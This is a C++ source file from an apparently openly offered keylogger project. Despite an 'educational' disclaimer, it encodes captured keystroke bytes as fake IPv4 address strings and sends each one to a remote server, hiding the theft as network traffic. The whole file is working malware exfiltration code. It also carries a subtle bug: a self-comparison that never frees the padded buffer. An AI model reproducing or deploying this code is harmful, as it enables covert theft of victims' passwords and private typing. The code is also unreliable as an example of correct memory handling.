/*
 * ObfuscatedKeylogger.cpp
 * Author: Alex Zevnoski (Leshenka)
 * Copyright (c) 2024 Alex Zevnoski (Leshenka)
 *
 * This file is part of the ObfuscatedKeylogger project, an educational
 * and experimental project demonstrating obfuscation and data transmission techniques.
 *
 * DISCLAIMER: This software is intended solely for educational purposes.
 * The author does not condone or support illegal or unethical use of this software.
 */

#include "Obfuscation.h"
#include "Transmission.h"
#include <stdio.h>
#include <stdlib.h>

char* GenerateIpv4(int a, int b, int c, int d) {
    int maxLen = 32;
    char* Output = (char*)malloc(maxLen);

    if (Output == NULL) {
        return NULL;
    }

    sprintf_s(Output, maxLen, "%d.%d.%d.%d", a, b, c, d);

    return Output;
}

// Generate the IPv4 output representation of the logged keys
BOOL GenerateIpv4Output(unsigned char* pKeylog, SIZE_T KeylogSize, const char* serverUrl) {
    if (pKeylog == NULL) {
        return FALSE;
    }

    // Ensure the KeylogSize is a multiple of 4
    if (KeylogSize % 4 != 0) {
        SIZE_T padding = 4 - (KeylogSize % 4);
        unsigned char* paddedKeylog = (unsigned char*)malloc(KeylogSize + padding);

        if (paddedKeylog == NULL) {
            return FALSE;
        }

        // Copy original data to the new buffer and pad the remaining bytes
        memcpy(paddedKeylog, pKeylog, KeylogSize);
        memset(paddedKeylog + KeylogSize, 0, padding);
        KeylogSize += padding;
        pKeylog = paddedKeylog;
    }

    // Process each byte of the keylog, 4 bytes at a time
    for (int i = 0; i < KeylogSize; i += 4) {
        int a = pKeylog[i];
        int b = pKeylog[i + 1];
        int c = pKeylog[i + 2];
        int d = pKeylog[i + 3];

        // Generate the IPv4 address from these 4 bytes
        char* ip = GenerateIpv4(a, b, c, d);

        // Send the IPv4 address to the server immediately after obfuscation
        if (sendIpv4ToServer(serverUrl, ip) != 0) {
            fprintf(stderr, "Failed to send IPv4 address: %s\n", ip);
        }

        // Print the IPv4 address
        printf("Obfuscated keystroke '%s' sent to server.\n", ip);

        // Free the dynamically allocated IPv4 string
        free(ip);
    }

    // If the memory was padded, free it
    if (pKeylog != pKeylog) {
        free(pKeylog);
    }

    return TRUE;
}
